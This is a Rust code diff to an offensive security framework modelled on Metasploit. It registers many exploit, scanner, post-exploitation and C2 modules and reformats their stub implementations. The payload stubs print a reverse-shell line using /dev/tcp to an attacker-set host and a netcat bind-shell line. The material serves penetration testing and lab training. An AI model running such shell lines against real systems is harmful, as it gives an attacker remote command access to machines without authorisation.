@@ -5,90 +5,109 @@ use crate::registry::ModuleRegistry;
 /// Register all built-in modules into the registry.
 pub fn register_builtin_modules(registry: &mut ModuleRegistry) {
     // Auxiliary modules
-    registry.register(crate::builtin::scanner::TcpSynScanner::new());
-    registry.register(crate::builtin::auxiliary::PortScanner::new());
-    registry.register(crate::builtin::auxiliary::FtpAnonymous::new());
-    registry.register(crate::builtin::auxiliary::SshVersion::new());
+    registry.register(crate::builtin::scanner::TcpSynScanner {});
+    registry.register(crate::builtin::auxiliary::PortScanner {});
+    registry.register(crate::builtin::auxiliary::FtpAnonymous {});
+    registry.register(crate::builtin::auxiliary::SshVersion {});
 
     // Payload modules
-    registry.register(crate::builtin::payloads::ReverseTcpShell::new());
-    registry.register(crate::builtin::payloads::BindTcpShell::new());
-    registry.register(crate::builtin::payloads::CmdExec::new());
+    registry.register(crate::builtin::payloads::ReverseTcpShell {});
+    registry.register(crate::builtin::payloads::BindTcpShell {});
+    registry.register(crate::builtin::payloads::CmdExec {});
 
     // Post modules
-    registry.register(crate::builtin::post::SocksProxy::new());
-    registry.register(crate::builtin::post::FileUpload::new());
+    registry.register(crate::builtin::post::SocksProxy {});
+    registry.register(crate::builtin::post::FileUpload {});
 
     // C2 modules
-    registry.register(crate::builtin::c2::C2Server::new());
+    registry.register(crate::builtin::c2::C2Server {});
 
     // Blue Team modules
-    registry.register(crate::builtin::blueteam::LogAnalyzer::new());
-    registry.register(crate::builtin::blueteam::TrafficMonitor::new());
+    registry.register(crate::builtin::blueteam::LogAnalyzer {});
+    registry.register(crate::builtin::blueteam::TrafficMonitor {});
 
     // Lab exploit modules
-    registry.register(crate::builtin::lab_exploits::CmdInjection::new());
-    registry.register(crate::builtin::lab_exploits::PathTraversal::new());
-    registry.register(crate::builtin::lab_exploits::SqliScanner::new());
-    registry.register(crate::builtin::lab_exploits::WebShellUpload::new());
-    registry.register(crate::builtin::lab_exploits::SSTI::new());
-    registry.register(crate::builtin::lab_exploits::Deserialization::new());
-    registry.register(crate::builtin::lab_exploits::SsrfExploit::new());
-    registry.register(crate::builtin::lab_exploits::Kerberoast::new());
-    registry.register(crate::builtin::lab_exploits::AsRepRoast::new());
-    registry.register(crate::builtin::lab_exploits::Log4Shell::new());
-    registry.register(crate::builtin::lab_exploits::ProxyShell::new());
-    registry.register(crate::builtin::lab_exploits::BlueKeep::new());
-    registry.register(crate::builtin::lab_exploits::EternalBlue::new());
-    registry.register(crate::builtin::lab_exploits::RedisUnauth::new());
-    registry.register(crate::builtin::lab_exploits::MySQLBypass::new());
-    registry.register(crate::builtin::lab_exploits::PostgresRCE::new());
-    registry.register(crate::builtin::lab_exploits::TomcatDeploy::new());
-    registry.register(crate::builtin::lab_exploits::JenkinsScriptConsole::new());
-    registry.register(crate::builtin::lab_exploits::WpPluginUpload::new());
-    registry.register(crate::builtin::lab_exploits::VncAuthBypass::new());
-    registry.register(crate::builtin::lab_exploits::MongoUnauth::new());
-    registry.register(crate::builtin::lab_exploits::ElasticRCE::new());
-    registry.register(crate::builtin::lab_exploits::DockerAPI::new());
-    registry.register(crate::builtin::lab_exploits::WinRmLogin::new());
+    registry.register(crate::builtin::lab_exploits::CmdInjection {});
+    registry.register(crate::builtin::lab_exploits::PathTraversal {});
+    registry.register(crate::builtin::lab_exploits::SqliScanner {});
+    registry.register(crate::builtin::lab_exploits::WebShellUpload {});
+    registry.register(crate::builtin::lab_exploits::SSTI {});
+    registry.register(crate::builtin::lab_exploits::Deserialization {});
+    registry.register(crate::builtin::lab_exploits::SsrfExploit {});
+    registry.register(crate::builtin::lab_exploits::Kerberoast {});
+    registry.register(crate::builtin::lab_exploits::AsRepRoast {});
+    registry.register(crate::builtin::lab_exploits::Log4Shell {});
+    registry.register(crate::builtin::lab_exploits::ProxyShell {});
+    // Windows-only exploits - disabled for Linux-only build
+    // registry.register(crate::builtin::lab_exploits::BlueKeep {});
+    // registry.register(crate::builtin::lab_exploits::EternalBlue {});
+    registry.register(crate::builtin::lab_exploits::RedisUnauth {});
+    registry.register(crate::builtin::lab_exploits::MySQLBypass {});
+    registry.register(crate::builtin::lab_exploits::PostgresRCE {});
+    registry.register(crate::builtin::lab_exploits::TomcatDeploy {});
+    registry.register(crate::builtin::lab_exploits::JenkinsScriptConsole {});
+    registry.register(crate::builtin::lab_exploits::WpPluginUpload {});
+    registry.register(crate::builtin::lab_exploits::VncAuthBypass {});
+    registry.register(crate::builtin::lab_exploits::MongoUnauth {});
+    registry.register(crate::builtin::lab_exploits::ElasticRCE {});
+    registry.register(crate::builtin::lab_exploits::DockerAPI {});
+    registry.register(crate::builtin::lab_exploits::WinRmLogin {});
+    // New high-impact web exploits
+    registry.register(crate::builtin::lab_exploits::StrutsRCE2017 {});
+    registry.register(crate::builtin::lab_exploits::StrutsRCE2018 {});
+    registry.register(crate::builtin::lab_exploits::PhpCgiRCE {});
+    registry.register(crate::builtin::lab_exploits::JenkinsRCE {});
 
     // Lab scanner modules
-    registry.register(crate::builtin::lab_scanners::SshLogin::new());
-    registry.register(crate::builtin::lab_scanners::FtpLogin::new());
-    registry.register(crate::builtin::lab_scanners::HttpLogin::new());
-    registry.register(crate::builtin::lab_scanners::SsrfScanner::new());
-    registry.register(crate::builtin::lab_scanners::XssScanner::new());
-    registry.register(crate::builtin::lab_scanners::KerbEnum::new());
-    registry.register(crate::builtin::lab_scanners::LdapSearch::new());
-    registry.register(crate::builtin::lab_scanners::SmbEnum::new());
-    registry.register(crate::builtin::lab_scanners::SnmpEnum::new());
-    registry.register(crate::builtin::lab_scanners::RdpEnum::new());
-    registry.register(crate::builtin::lab_scanners::VncEnum::new());
-    registry.register(crate::builtin::lab_scanners::SmtpEnum::new());
-    registry.register(crate::builtin::lab_scanners::SnmpBrute::new());
-    registry.register(crate::builtin::lab_scanners::MemcachedEnum::new());
-    registry.register(crate::builtin::lab_scanners::NfsEnum::new());
+    registry.register(crate::builtin::lab_scanners::SshLogin {});
+    registry.register(crate::builtin::lab_scanners::FtpLogin {});
+    registry.register(crate::builtin::lab_scanners::HttpLogin {});
+    registry.register(crate::builtin::lab_scanners::SsrfScanner {});
+    registry.register(crate::builtin::lab_scanners::XssScanner {});
+    registry.register(crate::builtin::lab_scanners::KerbEnum {});
+    registry.register(crate::builtin::lab_scanners::LdapSearch {});
+    registry.register(crate::builtin::lab_scanners::SmbEnum {});
+    registry.register(crate::builtin::lab_scanners::SnmpEnum {});
+    registry.register(crate::builtin::lab_scanners::RdpEnum {});
+    registry.register(crate::builtin::lab_scanners::VncEnum {});
+    registry.register(crate::builtin::lab_scanners::SmtpEnum {});
+    registry.register(crate::builtin::lab_scanners::SnmpBrute {});
+    registry.register(crate::builtin::lab_scanners::MemcachedEnum {});
+    registry.register(crate::builtin::lab_scanners::NfsEnum {});
+    // New network enumeration modules (functional replacements)
+    registry.register(crate::builtin::lab_scanners::TelnetClient {});
+    registry.register(crate::builtin::lab_scanners::SnmpNetworkEnum {});
+    registry.register(crate::builtin::lab_scanners::SmtpNetworkEnum {});
 
     // Lab post-exploitation modules
-    registry.register(crate::builtin::lab_post::LinuxEnum::new());
-    registry.register(crate::builtin::lab_post::WindowsEnum::new());
-    registry.register(crate::builtin::lab_post::UnrealIRCD::new());
-    registry.register(crate::builtin::lab_post::VsftpdBackdoor::new());
-    registry.register(crate::builtin::lab_post::SambaUsermap::new());
+    registry.register(crate::builtin::lab_post::LinuxEnum {});
+    registry.register(crate::builtin::lab_post::WindowsEnum {});
+    registry.register(crate::builtin::lab_post::UnrealIRCD {});
+    registry.register(crate::builtin::lab_post::VsftpdBackdoor {});
+    registry.register(crate::builtin::lab_post::SambaUsermap {});
+    // New Linux post-exploitation modules
+    registry.register(crate::builtin::lab_post::SuidEscalation {});
+    registry.register(crate::builtin::lab_post::ReverseShellListener {});
+    registry.register(crate::builtin::lab_post::LinuxPostEnum {});
+    registry.register(crate::builtin::lab_post::WebshellHandler {});
 }
 
 /// Placeholder module implementations for testing the framework structure.
 pub mod scanner {
-    use std::sync::LazyLock;
-    use std::pin::Pin;
     use std::future::Future;
+    use std::pin::Pin;
+    use std::sync::LazyLock;
 
-    use rcf_core::{Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target};
+    use rcf_core::{
+        Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target,
+    };
 
     static INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
         name: "auxiliary/scanner/port/tcp_syn".to_string(),
         display_name: "TCP SYN Port Scanner".to_string(),
-        description: "A fast asynchronous TCP SYN port scanner. Scans specified port ranges on target hosts.".to_string(),
+        description:
+            "A fast asynchronous TCP SYN port scanner. Scans specified port ranges on target hosts."
+                .to_string(),
         authors: vec!["RCF Team".to_string()],
         category: ModuleCategory::Auxiliary,
         rank: 90,
@@ -98,6 +117,12 @@ pub mod scanner {
     });
 
     pub struct TcpSynScanner;
+
+    impl Default for TcpSynScanner {
+        fn default() -> Self {
+            Self
+        }
+    }
 
     impl TcpSynScanner {
         pub fn new() -> Self {
@@ -112,7 +137,11 @@ pub mod scanner {
 
         fn options(&self) -> ModuleOptions {
             let mut opts = ModuleOptions::new();
-            opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host(s)"));
+            opts.add(rcf_core::ModuleOption::new(
+                "RHOSTS",
+                true,
+                "Target host(s)",
+            ));
             opts.add(rcf_core::ModuleOption::with_default(
                 "RPORT",
                 false,
@@ -158,11 +187,13 @@ pub mod scanner {
 }
 
 pub mod payloads {
-    use std::pin::Pin;
     use std::future::Future;
+    use std::pin::Pin;
     use std::sync::LazyLock;
 
-    use rcf_core::{Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target};
+    use rcf_core::{
+        Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target,
+    };
 
     // Reverse TCP Shell
     static REVERSE_TCP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
@@ -179,6 +210,12 @@ pub mod payloads {
 
     pub struct ReverseTcpShell;
 
+    impl Default for ReverseTcpShell {
+        fn default() -> Self {
+            Self
+        }
+    }
+
     impl ReverseTcpShell {
         pub fn new() -> Self {
             Self
@@ -192,7 +229,11 @@ pub mod payloads {
 
         fn options(&self) -> ModuleOptions {
             let mut opts = ModuleOptions::new();
-            opts.add(rcf_core::ModuleOption::new("LHOST", true, "Local address to listen on"));
+            opts.add(rcf_core::ModuleOption::new(
+                "LHOST",
+                true,
+                "Local address to listen on",
+            ));
             opts.add(rcf_core::ModuleOption::with_default(
                 "LPORT",
                 false,
@@ -216,7 +257,11 @@ pub mod payloads {
                     "Payload generated: reverse_tcp -> {}:{}\nShellcode: /bin/sh -i >& /dev/tcp/{}/{} 0>&1",
                     lhost, lport, lhost, lport
                 );
-                Ok(ModuleOutput::success(&info_name, &format!("{}:{}", lhost, lport), &msg))
+                Ok(ModuleOutput::success(
+                    &info_name,
+                    &format!("{}:{}", lhost, lport),
+                    &msg,
+                ))
             })
         }
     }
@@ -235,6 +280,12 @@ pub mod payloads {
     });
 
     pub struct BindTcpShell;
+
+    impl Default for BindTcpShell {
+        fn default() -> Self {
+            Self
+        }
+    }
 
     impl BindTcpShell {
         pub fn new() -> Self {
@@ -271,7 +322,11 @@ pub mod payloads {
                     "Payload generated: bind_tcp on port {}\nShellcode: nc -lvp {} -e /bin/sh",
                     port, port
                 );
-                Ok(ModuleOutput::success(&info_name, &format!("0.0.0.0:{}", port), &msg))
+                Ok(ModuleOutput::success(
+                    &info_name,
+                    &format!("0.0.0.0:{}", port),
+                    &msg,
+                ))
             })
         }
     }
@@ -281,7 +336,8 @@ pub mod payloads {
     static CMD_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
         name: "payload/cmd/unix/exec".to_string(),
         display_name: "Command Execution".to_string(),
-        description: "Execute an arbitrary command on the target system. Returns stdout/stderr.".to_string(),
+        description: "Execute an arbitrary command on the target system. Returns stdout/stderr."
+            .to_string(),
         authors: vec!["RCF Team".to_string()],
         category: ModuleCategory::Payload,
         rank: 70,
@@ -291,17 +347,36 @@ pub mod payloads {
     });
 
     pub struct CmdExec;
+
+    impl Default for CmdExec {
+        fn default() -> Self {
+            Self
+        }
+    }
+
     impl CmdExec {
-        pub fn new() -> Self { Self }
+        pub fn new() -> Self {
+            Self
+        }
     }
     impl Module for CmdExec {
-        fn info(&self) -> &ModuleInfo { &CMD_INFO }
+        fn info(&self) -> &ModuleInfo {
+            &CMD_INFO
+        }
         fn options(&self) -> ModuleOptions {
             let mut opts = ModuleOptions::new();
-            opts.add(rcf_core::ModuleOption::new("CMD", true, "Command to execute"));
+            opts.add(rcf_core::ModuleOption::new(
+                "CMD",
+                true,
+                "Command to execute",
+            ));
             opts
         }
-        fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+        fn run(
+            &self,
+            ctx: &mut Context,
+            _target: &Target,
+        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
             let info_name = self.info().name.clone();
             let cmd = ctx.get("CMD").cloned().unwrap_or_else(|| "id".to_string());
             Box::pin(async move {
@@ -313,11 +388,13 @@ pub mod payloads {
 }
 
 pub mod post {
-    use std::pin::Pin;
     use std::future::Future;
+    use std::pin::Pin;
     use std::sync::LazyLock;
 
-    use rcf_core::{Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target};
+    use rcf_core::{
+        Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target,
+    };
 
     static SOCKS_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
         name: "post/multi/manage/socks_proxy".to_string(),
@@ -332,6 +409,12 @@ pub mod post {
     });
 
     pub struct SocksProxy;
+
+    impl Default for SocksProxy {
+        fn default() -> Self {
+            Self
+        }
+    }
 
     impl SocksProxy {
         pub fn new() -> Self {
@@ -368,7 +451,11 @@ pub mod post {
                     "SOCKS5 proxy stub on port {} (Phase 4 implementation pending)",
                     port
                 );
-                Ok(ModuleOutput::success(&info_name, &format!("0.0.0.0:{}", port), &msg))
+                Ok(ModuleOutput::success(
+                    &info_name,
+                    &format!("0.0.0.0:{}", port),
+                    &msg,
+                ))
             })
         }
     }
@@ -388,19 +475,42 @@ pub mod post {
     });
 
     pub struct FileUpload;
+
+    impl Default for FileUpload {
+        fn default() -> Self {
+            Self
+        }
+    }
+
     impl FileUpload {
-        pub fn new() -> Self { Self }
+        pub fn new() -> Self {
+            Self
+        }
     }
     impl Module for FileUpload {
-        fn info(&self) -> &ModuleInfo { &UPLOAD_INFO }
+        fn info(&self) -> &ModuleInfo {
+            &UPLOAD_INFO
+        }
         fn options(&self) -> ModuleOptions {
             let mut opts = ModuleOptions::new();
             opts.add(rcf_core::ModuleOption::new("SESSION", false, "Session ID"));
-            opts.add(rcf_core::ModuleOption::new("LOCAL_FILE", true, "Local file to upload"));
-            opts.add(rcf_core::ModuleOption::new("REMOTE_PATH", true, "Remote destination path"));
+            opts.add(rcf_core::ModuleOption::new(
+                "LOCAL_FILE",
+                true,
+                "Local file to upload",
+            ));
+            opts.add(rcf_core::ModuleOption::new(
+                "REMOTE_PATH",
+                true,
+                "Remote destination path",
+            ));
             opts
         }
-        fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+        fn run(
+            &self,
+            ctx: &mut Context,
+            _target: &Target,
+        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
             let info_name = self.info().name.clone();
             let local = ctx.get("LOCAL_FILE").cloned().unwrap_or_default();
             let remote = ctx.get("REMOTE_PATH").cloned().unwrap_or_default();
@@ -413,13 +523,16 @@ pub mod post {
 }
 
 pub mod c2 {
-    use std::pin::Pin;
     use std::future::Future;
+    use std::pin::Pin;
     use std::sync::LazyLock;
 
-    use rcf_core::{Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target};
+    use rcf_core::{
+        Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target,
+    };
 
-    static C2_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+    static C2_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+        ModuleInfo {
         name: "exploit/multi/handler".to_string(),
         display_name: "C2 Server Handler".to_string(),
         description: "Generic command and control handler. Listens for incoming agent connections and manages sessions. Supports TLS 1.3 encrypted channels.".to_string(),
@@ -429,9 +542,16 @@ pub mod c2 {
         stability: "beta".to_string(),
         disclosure_date: None,
         references: vec![],
+    }
     });
 
     pub struct C2Server;
+
+    impl Default for C2Server {
+        fn default() -> Self {
+            Self
+        }
+    }
 
     impl C2Server {
         pub fn new() -> Self {
@@ -473,7 +593,10 @@ pub mod c2 {
             _target: &Target,
         ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
             let info_name = self.info().name.clone();
-            let lhost = ctx.get("LHOST").cloned().unwrap_or_else(|| "0.0.0.0".to_string());
+            let lhost = ctx
+                .get("LHOST")
+                .cloned()
+                .unwrap_or_else(|| "0.0.0.0".to_string());
             let lport = ctx.get_lport();
 
             Box::pin(async move {
@@ -481,20 +604,27 @@ pub mod c2 {
                     "C2 server listening on {}:{} (TLS encrypted)\n[*] Waiting for incoming connections...\n[*] Use 'sessions' to list active agents",
                     lhost, lport
                 );
-                Ok(ModuleOutput::success(&info_name, &format!("{}:{}", lhost, lport), &msg))
+                Ok(ModuleOutput::success(
+                    &info_name,
+                    &format!("{}:{}", lhost, lport),
+                    &msg,
+                ))
             })
         }
     }
 }
 
 pub mod blueteam {
-    use std::pin::Pin;
     use std::future::Future;
+    use std::pin::Pin;
     use std::sync::LazyLock;
 
-    use rcf_core::{Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target};
+    use rcf_core::{
+        Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target,
+    };
 
-    static LOG_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+    static LOG_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+        ModuleInfo {
         name: "auxiliary/scanner/log_analysis".to_string(),
         display_name: "Log Analyzer".to_string(),
         description: "Analyze system logs for indicators of compromise (IOCs). Parses auth.log, syslog, and Windows Event Logs to detect suspicious activity, brute force attempts, and lateral movement.".to_string(),
@@ -504,9 +634,16 @@ pub mod blueteam {
         stability: "beta".to_string(),
         disclosure_date: None,
         references: vec!["https://attack.mitre.org/".to_string()],
+    }
     });
 
     pub struct LogAnalyzer;
+
+    impl Default for LogAnalyzer {
+        fn default() -> Self {
+            Self
+        }
+    }
 
     impl LogAnalyzer {
         pub fn new() -> Self {
@@ -521,7 +658,11 @@ pub mod blueteam {
 
         fn options(&self) -> ModuleOptions {
             let mut opts = ModuleOptions::new();
-            opts.add(rcf_core::ModuleOption::new("LOG_PATH", true, "Path to log file or directory"));
+            opts.add(rcf_core::ModuleOption::new(
+                "LOG_PATH",
+                true,
+                "Path to log file or directory",
+            ));
             opts.add(rcf_core::ModuleOption::with_default(
                 "LOG_TYPE",
                 false,
@@ -543,7 +684,10 @@ pub mod blueteam {
             _target: &Target,
         ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
             let info_name = self.info().name.clone();
-            let log_path = ctx.get("LOG_PATH").cloned().unwrap_or_else(|| "/var/log/auth.log".to_string());
+            let log_path = ctx
+                .get("LOG_PATH")
+                .cloned()
+                .unwrap_or_else(|| "/var/log/auth.log".to_string());
 
             Box::pin(async move {
                 let msg = format!(
@@ -557,7 +701,8 @@ pub mod blueteam {
 
     // ── Traffic Monitor ──
 
-    static TRAFFIC_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+    static TRAFFIC_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+        ModuleInfo {
         name: "auxiliary/scanner/traffic_monitor".to_string(),
         display_name: "Traffic Monitor".to_string(),
         description: "Monitor network traffic for suspicious activity. Captures packets and generates YARA/Sigma detection rules for blue team analysis.".to_string(),
@@ -567,24 +712,57 @@ pub mod blueteam {
         stability: "beta".to_string(),
         disclosure_date: None,
         references: vec!["https://attack.mitre.org/".to_string()],
+    }
     });
 
     pub struct TrafficMonitor;
+
+    impl Default for TrafficMonitor {
+        fn default() -> Self {
+            Self
+        }
+    }
+
     impl TrafficMonitor {
-        pub fn new() -> Self { Self }
+        pub fn new() -> Self {
+            Self
+        }
     }
     impl Module for TrafficMonitor {
-        fn info(&self) -> &ModuleInfo { &TRAFFIC_INFO }
+        fn info(&self) -> &ModuleInfo {
+            &TRAFFIC_INFO
+        }
         fn options(&self) -> ModuleOptions {
             let mut opts = ModuleOptions::new();
-            opts.add(rcf_core::ModuleOption::new("INTERFACE", false, "Network interface to monitor"));
-            opts.add(rcf_core::ModuleOption::with_default("FILTER", false, "BPF filter expression", rcf_core::OptionValue::String("tcp".to_string())));
-            opts.add(rcf_core::ModuleOption::with_default("DURATION", false, "Capture duration (seconds)", rcf_core::OptionValue::Integer(60)));
+            opts.add(rcf_core::ModuleOption::new(
+                "INTERFACE",
+                false,
+                "Network interface to monitor",
+            ));
+            opts.add(rcf_core::ModuleOption::with_default(
+                "FILTER",
+                false,
+                "BPF filter expression",
+                rcf_core::OptionValue::String("tcp".to_string()),
+            ));
+            opts.add(rcf_core::ModuleOption::with_default(
+                "DURATION",
+                false,
+                "Capture duration (seconds)",
+                rcf_core::OptionValue::Integer(60),
+            ));
             opts
         }
-        fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+        fn run(
+            &self,
+            ctx: &mut Context,
+            _target: &Target,
+        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
             let info_name = self.info().name.clone();
-            let iface = ctx.get("INTERFACE").cloned().unwrap_or_else(|| "any".to_string());
+            let iface = ctx
+                .get("INTERFACE")
+                .cloned()
+                .unwrap_or_else(|| "any".to_string());
             Box::pin(async move {
                 let msg = format!("Monitoring traffic on interface '{}' (stub)", iface);
                 Ok(ModuleOutput::success(&info_name, &iface, &msg))
@@ -596,15 +774,18 @@ pub mod blueteam {
 // ─── Additional Auxiliary Modules ────────────────────────────────────────────
 
 pub mod auxiliary {
-    use std::pin::Pin;
     use std::future::Future;
+    use std::pin::Pin;
     use std::sync::LazyLock;
 
-    use rcf_core::{Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target};
+    use rcf_core::{
+        Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target,
+    };
 
     // ── Port Scanner (dedicated auxiliary module) ──
 
-    static PORT_SCAN_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+    static PORT_SCAN_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+        ModuleInfo {
         name: "auxiliary/scanner/port/full_scan".to_string(),
         display_name: "Full Port Scan".to_string(),
         description: "Comprehensive port scanner with service detection and OS fingerprinting. Supports TCP connect and SYN scanning modes.".to_string(),
@@ -614,35 +795,70 @@ pub mod auxiliary {
         stability: "stable".to_string(),
         disclosure_date: Some("2026-04-05".to_string()),
         references: vec![],
+    }
     });
 
     pub struct PortScanner;
+
+    impl Default for PortScanner {
+        fn default() -> Self {
+            Self
+        }
+    }
+
     impl PortScanner {
-        pub fn new() -> Self { Self }
+        pub fn new() -> Self {
+            Self
+        }
     }
     impl Module for PortScanner {
-        fn info(&self) -> &ModuleInfo { &PORT_SCAN_INFO }
+        fn info(&self) -> &ModuleInfo {
+            &PORT_SCAN_INFO
+        }
         fn options(&self) -> ModuleOptions {
             let mut opts = ModuleOptions::new();
-            opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host(s)"));
-            opts.add(rcf_core::ModuleOption::with_default("PORTS", false, "Port range", rcf_core::OptionValue::String("1-65535".to_string())));
-            opts.add(rcf_core::ModuleOption::with_default("MODE", false, "Scan mode: connect/syn", rcf_core::OptionValue::String("connect".to_string())));
+            opts.add(rcf_core::ModuleOption::new(
+                "RHOSTS",
+                true,
+                "Target host(s)",
+            ));
+            opts.add(rcf_core::ModuleOption::with_default(
+                "PORTS",
+                false,
+                "Port range",
+                rcf_core::OptionValue::String("1-65535".to_string()),
+            ));
+            opts.add(rcf_core::ModuleOption::with_default(
+                "MODE",
+                false,
+                "Scan mode: connect/syn",
+                rcf_core::OptionValue::String("connect".to_string()),
+            ));
             opts
         }
-        fn run(&self, ctx: &mut Context, target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+        fn run(
+            &self,
+            _ctx: &mut Context,
+            target: &Target,
+        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
             let info_name = self.info().name.clone();
             let host = target.host.clone();
             let port = target.port;
             Box::pin(async move {
                 let msg = format!("Port scanning {}:{}", host, port);
-                Ok(ModuleOutput::success(&info_name, &format!("{}:{}", host, port), &msg))
+                Ok(ModuleOutput::success(
+                    &info_name,
+                    &format!("{}:{}", host, port),
+                    &msg,
+                ))
             })
         }
     }
 
     // ── FTP Anonymous Login Check ──
 
-    static FTP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+    static FTP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+        ModuleInfo {
         name: "auxiliary/scanner/ftp/anonymous".to_string(),
         display_name: "FTP Anonymous Login".to_string(),
         description: "Checks if FTP servers allow anonymous login. Enumerates accessible directories and lists files.".to_string(),
@@ -652,34 +868,64 @@ pub mod auxiliary {
         stability: "stable".to_string(),
         disclosure_date: None,
         references: vec!["https://cwe.mitre.org/data/definitions/287.html".to_string()],
+    }
     });
 
     pub struct FtpAnonymous;
+
+    impl Default for FtpAnonymous {
+        fn default() -> Self {
+            Self
+        }
+    }
+
     impl FtpAnonymous {
-        pub fn new() -> Self { Self }
+        pub fn new() -> Self {
+            Self
+        }
     }
     impl Module for FtpAnonymous {
-        fn info(&self) -> &ModuleInfo { &FTP_INFO }
+        fn info(&self) -> &ModuleInfo {
+            &FTP_INFO
+        }
         fn options(&self) -> ModuleOptions {
             let mut opts = ModuleOptions::new();
-            opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target FTP server(s)"));
-            opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "FTP port", rcf_core::OptionValue::Integer(21)));
+            opts.add(rcf_core::ModuleOption::new(
+                "RHOSTS",
+                true,
+                "Target FTP server(s)",
+            ));
+            opts.add(rcf_core::ModuleOption::with_default(
+                "RPORT",
+                false,
+                "FTP port",
+                rcf_core::OptionValue::Integer(21),
+            ));
             opts
         }
-        fn run(&self, _ctx: &mut Context, target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+        fn run(
+            &self,
+            _ctx: &mut Context,
+            target: &Target,
+        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
             let info_name = self.info().name.clone();
             let host = target.host.clone();
             let port = target.port;
             Box::pin(async move {
                 let msg = format!("Checking FTP anonymous login on {}:{}", host, port);
-                Ok(ModuleOutput::success(&info_name, &format!("{}:{}", host, port), &msg))
+                Ok(ModuleOutput::success(
+                    &info_name,
+                    &format!("{}:{}", host, port),
+                    &msg,
+                ))
             })
         }
     }
 
     // ── SSH Version Detection ──
 
-    static SSH_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+    static SSH_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+        ModuleInfo {
         name: "auxiliary/scanner/ssh/version".to_string(),
         display_name: "SSH Version Detection".to_string(),
         description: "Connects to SSH servers and extracts version information, supported algorithms, and OS detection.".to_string(),
@@ -689,27 +935,56 @@ pub mod auxiliary {
         stability: "stable".to_string(),
         disclosure_date: None,
         references: vec![],
+    }
     });
 
     pub struct SshVersion;
+
+    impl Default for SshVersion {
+        fn default() -> Self {
+            Self
+        }
+    }
+
     impl SshVersion {
-        pub fn new() -> Self { Self }
+        pub fn new() -> Self {
+            Self
+        }
     }
     impl Module for SshVersion {
-        fn info(&self) -> &ModuleInfo { &SSH_INFO }
+        fn info(&self) -> &ModuleInfo {
+            &SSH_INFO
+        }
         fn options(&self) -> ModuleOptions {
             let mut opts = ModuleOptions::new();
-            opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target SSH server(s)"));
-            opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "SSH port", rcf_core::OptionValue::Integer(22)));
+            opts.add(rcf_core::ModuleOption::new(
+                "RHOSTS",
+                true,
+                "Target SSH server(s)",
+            ));
+            opts.add(rcf_core::ModuleOption::with_default(
+                "RPORT",
+                false,
+                "SSH port",
+                rcf_core::OptionValue::Integer(22),
+            ));
             opts
         }
-        fn run(&self, _ctx: &mut Context, target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+        fn run(
+            &self,
+            _ctx: &mut Context,
+            target: &Target,
+        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
             let info_name = self.info().name.clone();
             let host = target.host.clone();
             let port = target.port;
             Box::pin(async move {
                 let msg = format!("Detecting SSH version on {}:{}", host, port);
-                Ok(ModuleOutput::success(&info_name, &format!("{}:{}", host, port), &msg))
+                Ok(ModuleOutput::success(
+                    &info_name,
+                    &format!("{}:{}", host, port),
+                    &msg,
+                ))
             })
         }
     }
@@ -718,24 +993,37 @@ pub mod auxiliary {
